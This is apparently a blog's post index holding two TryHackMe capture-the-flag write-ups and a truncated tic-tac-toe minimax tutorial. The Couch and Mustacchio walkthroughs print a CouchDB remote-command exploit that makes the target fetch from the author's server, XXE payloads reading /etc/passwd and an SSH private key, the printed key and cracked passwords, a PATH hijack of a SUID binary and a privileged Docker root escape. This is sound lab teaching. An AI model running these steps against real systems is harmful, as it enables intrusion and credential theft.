[ { "title": "THM - Couch", "url": "/posts/THM-couch/", "categories": "Try Hack Me", "tags": "CTF, THM, CouchDB, Docker", "date": "2022-07-27 00:00:00 +0000", "snippet": "NmapFirst, we use nmap to find the open ports :┌──(kali㉿kali)-[~/Desktop]└─$ nmap -A 10.10.232.160Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 08:09 EDTNmap scan report for 10.10.232.160Host is up (0.12s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)| 256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)|_ 256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe only have one port open? It’s strange, let’s scan all ports using “-p-“┌──(kali㉿kali)-[~/Desktop]└─$ nmap -A 10.10.232.160 -p-Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 08:16 EDTStats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 90.62% done; ETC: 08:22 (0:00:37 remaining)Stats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 90.63% done; ETC: 08:22 (0:00:37 remaining)Stats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 90.63% done; ETC: 08:22 (0:00:37 remaining)Stats: 0:08:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 99.87% done; ETC: 08:24 (0:00:01 remaining)Stats: 0:08:17 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 99.99% done; ETC: 08:24 (0:00:00 remaining)Stats: 0:08:19 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 99.99% done; ETC: 08:24 (0:00:00 remaining)Stats: 0:08:19 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 99.99% done; ETC: 08:24 (0:00:00 remaining)Nmap scan report for 10.10.232.160Host is up (0.077s latency).Not shown: 65528 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)| 256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)|_ 256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)226/tcp filtered unknown5984/tcp open http CouchDB httpd 1.6.1 (Erlang OTP/18)|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)26859/tcp filtered unknown33525/tcp filtered unknown43307/tcp filtered unknown62999/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 518.11 secondsAfter 8 MINUTES ! We find that the port 5984 is also open.Port 5984Looking at the webpage we see that CouchDB is running on this port.Wrong way !Using searchsploit i’ve found a RCE vuln.┌──(kali㉿kali)-[~]└─$ searchsploit couchdb ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Apache CouchDB - Arbitrary Command Execution (Metasploit) | linux/remote/45019.rbApache CouchDB 1.5.0 - &#39;uuids&#39; Denial of Service | multiple/dos/32519.txtApache CouchDB 1.7.0 / 2.x &amp;lt; 2.1.1 - Remote Privilege Escalation | linux/webapps/44498.pyApache CouchDB 2.0.0 - Local Privilege Escalation | windows/local/40865.txtApache CouchDB 2.3.0 - Cross-Site Scripting | multiple/webapps/46406.txtApache CouchDB 2.3.1 - Cross-Site Request Forgery / Cross-Site Scripting | multiple/webapps/46595.txtApache CouchDB &amp;lt; 2.1.0 - Remote Code Execution | linux/webapps/44913.py------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsI was unable to see the commands outputs so i opened a http server. I asked the victim to connect to my server to see if my command was really executed.┌──(kali㉿kali)-[~]└─$ python3 44913.py --priv -c &quot;wget http://10.8.80.139:8000/test&quot; http://10.10.232.160:5984[*] Detected CouchDB Version 1.6.1[+] User guest with password guest successfully created.[+] Created payload at: http://10.10.232.160:5984/_config/query_servers/cmdHaving a look at our server :┌──(kali㉿kali)-[~]└─$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...10.10.232.160 - - [27/Jul/2022 08:31:31] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:31] &quot;GET /test HTTP/1.1&quot; 404 -10.10.232.160 - - [27/Jul/2022 08:31:32] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:32] &quot;GET /test HTTP/1.1&quot; 404 -10.10.232.160 - - [27/Jul/2022 08:31:32] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:32] &quot;GET /test HTTP/1.1&quot; 404 -10.10.232.160 - - [27/Jul/2022 08:31:32] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:32] &quot;GET /test HTTP/1.1&quot; 404 -10.10.232.160 - - [27/Jul/2022 08:31:32] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:32] &quot;GET /test HTTP/1.1&quot; 404 -10.10.232.160 - - [27/Jul/2022 08:31:32] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:32] &quot;GET /test HTTP/1.1&quot; 404 -10.10.232.160 - - [27/Jul/2022 08:31:32] code 404, message File not found10.10.232.160 - - [27/Jul/2022 08:31:32] &quot;GET /test HTTP/1.1&quot; 404 -Our command are executed !I tried several payloads to get a reverse shell (perl, bash, php, python, …) but nothing worked..Let’s enumerate more.Good way !Thanks to couchDB documentation we see that we can browse to /utils to see dbs.We find credentials : “atena:t4qfzcc4qN##”Let’s use these creds to connect to the ssh server.┌──(kali㉿kali)-[~]└─$ ssh atena@10.10.232.160 atena@10.10.232.160&#39;s password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageLast login: Wed Jul 27 05:45:17 2022 from 10.8.80.139^Catena@ubuntu:~$ ls -latotal 52drwxr-xr-x 6 atena atena 4096 Jul 27 05:49 .drwxr-xr-x 3 root root 4096 Oct 24 2020 ..-rw------- 1 atena atena 3171 Dec 18 2020 .bash_history-rw-r--r-- 1 atena atena 220 Oct 24 2020 .bash_logout-rw-r--r-- 1 atena atena 3771 Oct 24 2020 .bashrcdrwxr-xr-x 3 root root 4096 Oct 24 2020 .bundledrwx------ 2 atena atena 4096 Oct 24 2020 .cachedrwx------ 2 root root 4096 Oct 24 2020 .gnupgdrwxrwxr-x 2 atena atena 4096 Dec 18 2020 .nano-rw-r--r-- 1 atena atena 655 Oct 24 2020 .profile-rw-rw-r-- 1 atena atena 66 Jul 27 05:49 .selected_editor-rw-r--r-- 1 atena atena 0 Oct 24 2020 .sudo_as_admin_successful-rw-rw-r-- 1 atena atena 22 Dec 18 2020 user.txt-rw-r--r-- 1 root root 183 Oct 24 2020 .wget-hstsPrivilege escalationWe notice that the .bash_history is not empty.Looking at it we discover that Docker has been launched as root !atena@ubuntu:~$ cat .bash_historysudo -scd /etc/apt/rm sources.rm sources.listwget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.listapt-get updateapt-get dist-upgrade sudo apt-get install software-properties-commonsudo add-apt-repository ppa:couchdb/stablesudo apt-get update[...]lscd /rootlscd flag/lscd ..rm -r flag/apt-get remove redisnano root.txtexitsudo deluser USERNAME sudosudo deluser atena sudoexitsudo -sdocker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpineuname -aexitWe just have to run this docker command :atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine/ # cat /mnt/root/root.txtNever keep sensitive data in your bash history." }, { "title": "THM - Mustacchio", "url": "/posts/THM-Mustacchio/", "categories": "Try Hack Me", "tags": "CTF, THM, XXE, SUID", "date": "2022-07-26 00:00:00 +0000", "snippet": "NmapAs always, we start the enumeration with nmap :┌──(kali㉿kali)-[~]└─$ nmap -A 10.10.93.229 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 10:31 EDTNmap scan report for 10.10.93.229Host is up (0.079s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)| 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)|_ 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Mustacchio | Home| http-robots.txt: 1 disallowed entry |_/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.31 secondsPort 80The website looks like a showcase site, all the pages are in HTML and you can’t interact with them.Let’s use dirsearch to find some hidden or interesting directories : ┌──(kali㉿kali)-[~]└─$ dirsearch -u http://10.10.251.221/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/10.10.251.221/-_22-07-26_09-01-18.txtError Log: /home/kali/.dirsearch/logs/errors-22-07-26_09-01-18.logTarget: http://10.10.251.221/[09:01:19] Starting: [09:01:38] 403 - 278B - /.ht_wsr.txt [09:01:38] 403 - 278B - /.htaccess.bak1 [09:01:38] 403 - 278B - /.htaccess.sample[09:01:38] 403 - 278B - /.htaccess.save[09:01:38] 403 - 278B - /.htaccess_extra[09:01:38] 403 - 278B - /.htaccessBAK[09:01:38] 403 - 278B - /.htaccess_sc[09:01:38] 403 - 278B - /.htaccess_orig[09:01:38] 403 - 278B - /.htaccessOLD[09:01:38] 403 - 278B - /.htaccessOLD2[09:01:38] 403 - 278B - /.htaccess.orig[09:01:38] 403 - 278B - /.htpasswd_test [09:01:38] 403 - 278B - /.htm[09:01:38] 403 - 278B - /.html [09:01:38] 403 - 278B - /.httr-oauth[09:01:38] 403 - 278B - /.htpasswds [09:01:47] 403 - 278B - /.php [09:01:47] 403 - 278B - /.php3 [09:02:38] 200 - 3KB - /about.html [09:03:39] 200 - 1KB - /contact.html [09:03:44] 200 - 1KB - /custom/ [09:04:00] 301 - 314B - /fonts -&amp;gt; http://10.10.251.221/fonts/ [09:04:02] 200 - 2KB - /gallery.html [09:04:10] 200 - 6KB - /images/ [09:04:10] 301 - 315B - /images -&amp;gt; http://10.10.251.221/images/ [09:04:13] 200 - 2KB - /index.html [09:05:06] 200 - 28B - /robots.txt [09:05:07] 403 - 278B - /server-status [09:05:07] 403 - 278B - /server-status/ Task Completed Nothing interesting except the /custom/In /custom/js we find “users.bak”, That’s quite strange.Inside this file we have :──(kali㉿kali)-[~/Downloads]└─$ cat users.bak ��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4bUsing crackstation we find that “1868e36a6d2b17d4c2745f1659433a54d4bc5f4b” is bulldog19 hashed with SHA-1.So we have creds : admin:bulldog19.I enumerate a lot but i was stuck. I didn’t find anything interestingLet’s start the port scan again, we may not have detected a port :┌──(kali㉿kali)-[~]└─$ nmap -A 10.10.251.221 -p-Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 09:08 EDTNmap scan report for 10.10.251.221Host is up (0.080s latency).Not shown: 65532 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)| 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)|_ 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Mustacchio | Home| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Apache/2.4.18 (Ubuntu)8765/tcp open http nginx 1.10.3 (Ubuntu)|_http-title: Mustacchio | Login|_http-server-header: nginx/1.10.3 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 577.54 secondsGreat ! Port 8765 is open !Port 8765The page ask for a username and a password. I tried with admin and bulldog19 and it’s worked.We have a comment section.In the source code we find this : &amp;lt;script type=&quot;text/javascript&quot;&amp;gt; //document.cookie = &quot;Example=/auth/dontforget.bak&quot;; function checktarea() { let tbox = document.getElementById(&quot;box&quot;).value; if (tbox == null || tbox.length == 0) { alert(&quot;Insert XML Code!&quot;) } }&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;!-- Barry, you can now SSH in using your key!--&amp;gt;We have a user Barry who can use SSH, good to know that.Inside /auth/dontforget.bak we have :┌──(kali㉿kali)-[~]└─$ cat Downloads/dontforget.bak &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Barry Clad&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&amp;lt;/com&amp;gt;&amp;lt;/comment&amp;gt;We know how to use our textbox ! We have to use this XML syntax.Let’s try to use XML injection.Using SecList we find some XML code to read file on a vulnerable target.I used this one :&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&amp;gt; ]&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Barry Clad&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;&amp;lt;/comment&amp;gt;In the page source code we have : &amp;lt;/form&amp;gt; &amp;lt;h3&amp;gt;Comment Preview:&amp;lt;/h3&amp;gt;&amp;lt;p&amp;gt;Name: Joe Hamd&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Author : Barry Clad&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Comment :&amp;lt;br&amp;gt; root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falselxd:x:106:65534::/var/lib/lxd/:/bin/falsemessagebus:x:107:111::/var/run/dbus:/bin/falseuuidd:x:108:112::/run/uuidd:/bin/falsednsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/falsesshd:x:110:65534::/var/run/sshd:/usr/sbin/nologinpollinate:x:111:1::/var/cache/pollinate:/bin/falsejoe:x:1002:1002::/home/joe:/bin/bashbarry:x:1003:1003::/home/barry:/bin/bash&amp;lt;p/&amp;gt; &amp;lt;/section&amp;gt;We can read code on the machine with this vulnerability.We know that barry can use ssh so his key should be on /home/barry/.ssh.id_rsa. Let’s try to grab it.Using this payload :&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &#39;file:///home/barry/.ssh/id_rsa&#39;&amp;gt; ]&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Barry Clad&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;&amp;lt;/comment&amp;gt;We get : &amp;lt;h3&amp;gt;Comment Preview:&amp;lt;/h3&amp;gt;&amp;lt;p&amp;gt;Name: Joe Hamd&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Author : Barry Clad&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Comment :&amp;lt;br&amp;gt; -----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25EjqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfNbNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMUMZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2DWfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7ENsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOieTH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdCrcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlXbhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB87+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWkiahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUspkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxglaXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9ovpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQKDZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUFckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD-----END RSA PRIVATE KEY-----&amp;lt;p/&amp;gt; &amp;lt;/section&amp;gt;We can now use this key to log in into the ssh server.┌──(kali㉿kali)-[~/Desktop]└─$ ssh barry@10.10.93.229 -i barryEnter passphrase for key &#39;barry&#39;:We need a passphrase… Let’s bruteforce it with john.┌──(kali㉿kali)-[~/Desktop]└─$ ssh2john barry &amp;gt; hash ┌──(kali㉿kali)-[~/Desktop]└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusurieljames (barry) 1g 0:00:00:01 DONE (2022-07-26 10:10) 0.8771g/s 2605Kp/s 2605Kc/s 2605KC/s urieljr.k..urielito1000Use the &quot;--show&quot; opDone !Now, we can access to the SSH server.Privilege escalationWe find an strange file named live_log in joe’s home folder.If we launch it we notice that it display the apache logs.barry@mustacchio:/home/joe$ find / -perm /4000 2&amp;gt;/dev/null/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/snapd/snap-confine/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/passwd/usr/bin/pkexec/usr/bin/chfn/usr/bin/newgrp/usr/bin/at/usr/bin/chsh/usr/bin/newgidmap/usr/bin/sudo/usr/bin/newuidmap/usr/bin/gpasswd/home/joe/live_log/bin/ping/bin/ping6/bin/umount/bin/mount/bin/fusermount/bin/subarry@mustacchio:/home/joe$ We also see that this file is an SUID file !If we exploit it we can become root.Using strings we see that the file is using “tail -f /var/log/nginx/access.log”barry@mustacchio:/home/joe$ strings live_log /lib64/ld-linux-x86-64.so.2libc.so.6setuidprintfsystem__cxa_finalizesetgid__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu+UH[]A\\A]A^A_Live Nginx Log Readertail -f /var/log/nginx/access.log &amp;lt;-HERE:*3$&quot;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.8060__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrydemo.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5printf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.commentThe program is using the tail command. If we add /tmp to the $PATH and we create a file /tmp/tail that starts a shell, the shell will be started by live_log who is a SUID file so we will become root.Prevent this attack ?It is very simple to prevent this attack, instead of using “tail”, use “/usr/bin/tail”. if you write the entire path, even if someone change the $PATH, /usr/bin/tail will always be launched.Let’s do it.barry@mustacchio:/home/joe$ echo &quot;/bin/bash&quot; &amp;gt; /tmp/tailbarry@mustacchio:/home/joe$ chmod +x /tmp/tailbarry@mustacchio:/home/joe$ /tmp/tailbarry@mustacchio:/home/joe$ PATH=/tmp:$PATHJust launch live_log now !barry@mustacchio:/home/joe$ ./live_logroot@mustacchio:/home/joe# cat /root/root.txtAnd the magic happens ! Thanks for reading !" }, { "title": "Tic Tac Toe - AI with Minimax algorithm", "url": "/posts/tic-tac-toe-minimax/", "categories": "AI", "tags": "AI, minimax", "date": "2022-07-08 00:00:00 +0000", "snippet": "Introduction :I was interested in artificial intelligence. So I challenged myself to make an artificial intelligence that wins every time at tic tac toe. First of all, how to do it?I read a lot about artificial intelligence.Here, there are two types of AI particularly interesting: Reinforcement learning : basically, we let the AI learn by itself, if it wins, we reward it. (it’s very schematized).The problem is that the AI has to play a lot for it to be reliable. So in theory it can make mistakes if it is not trained enough. AI with Minimax: Minimax is a basic decision making algorithm. It is simple to set up and will allow the AI to always make the right decision.Before playing each move, the AI will look at all the possibilities of the game to choose the best one. In a game like tic-tac-toe there are not many possibilities so the AI can study them all. The advantage is that the AI will never make a mistake because it will know all the possible situations. In tic-tac-toe, if you don’t make a mistake you can’t lose and you’ll make a tie at worst. If your opponent makes a mistake, you win. This algorithm is very useful, but it cannot be used in poker, for example, because there are too many possible hands. It will then be necessary to turn to Reinforcement learning because even if there will be a margin of error, the AI will learn and become stronger and stronger. Minimax optimization exists to use minimax even if there is many possibilities like the Depth Limited MinimaxBut before making an AI, we need a tic tac toe game !Tic tac toe !The different steps of tic-tac-toe : -Set up the graphical interface (with pygame)-Player 1 chooses where he wants to play-We check if the location is available-We draw the O or the X-We check for a win or a tie -Player 2’s turnFirst, i made a class Game() which creates a matrix full of “-1” because all spaces are available. We set the player turns number to 0 (because player one will start, we can switch it to 1 if we want player 2 to start).class Game(): pygame.init() blue=(20,189,172) screen=pygame.display.set_mode((600,600)) pygame.display.set_caption(&quot;tic tac toe&quot;) screen.fill(blue) def __init__(self): self.board=[ [-1,-1,-1] for i in range(3)] self.player_number=0We add a “show_board()” function to display the matrix. def show_board(self): for i in self.board: print(i)We create a “add_piece” function to add the new piece to the matrixdef add_piece(self,player_number): new_piece=self.user_play() if player_number==0: self.board[new_piece[0]][new_piece[1]]=&quot;X&quot; else: self.board[new_piece[0]][new_piece[1]]=&quot;O&quot;“add_piece” calls “user_play()” which is a big function who let the user where he wants to play, who let the AI choose where to play and who check if the choosen space is available.def user_play(self): print(f&quot;Player {self.player_number+1}, choose where do you place your piece (0,0)&quot;) #res=input(&quot;&amp;gt;&amp;gt;&quot;) while 1: has_played=False for event in pygame.event.get(): if event.type==pygame.QUIT: exit() if self.player_number==1: moove=self.MM(self.board,False,self.player_number)[1] column=moove[0] line=moove[1] has_played=True self.show_board() print(f&quot;Choosen : ({line},{column})&quot;) if event.type==pygame.MOUSEBUTTONDOWN or has_played: if has_played==False: mouseX=event.pos[0] mouseY=event.pos[1] column=int(mouseY//200) line=int(mouseX//200) if self.can_draw(line,column): if self.player_number==1: self.draw_circle(line,column) elif self.player_number==0: self.draw_cross(line,column) return (int(column),int(line)) else: print(&quot;Not here&quot;)If the player number is 1 we can the MM() function which is the minimax algorithm but we will come back to this later.If the player number is 0 we wait for a user click. We divide the coordinates by 200 to have the correspondant box.We check if the box is available thanks to the “can_draw function”. If the box is available we draw the correpondant letter.The “can_draw()” function will simply check if an box is available so if matrix[x][y] is equal to -1.def can_draw(self,y,x): if self.board[x][y]!=-1 : return False return TrueNow, a player can draw a new letter. Remember of our differents steps ! After the new piece we have to check if someone won.Let’s make a “check_win()” functionthis is a rather long but simple function. We look at all the possibilities of victory.We use pass the game_board as argument because our minimax algorithm will check the win for all possible gameboards, “game_board=0” means that if we don’t specify the game_board parameter then we check the current gameboarddef check_win(self,game_board=0): if 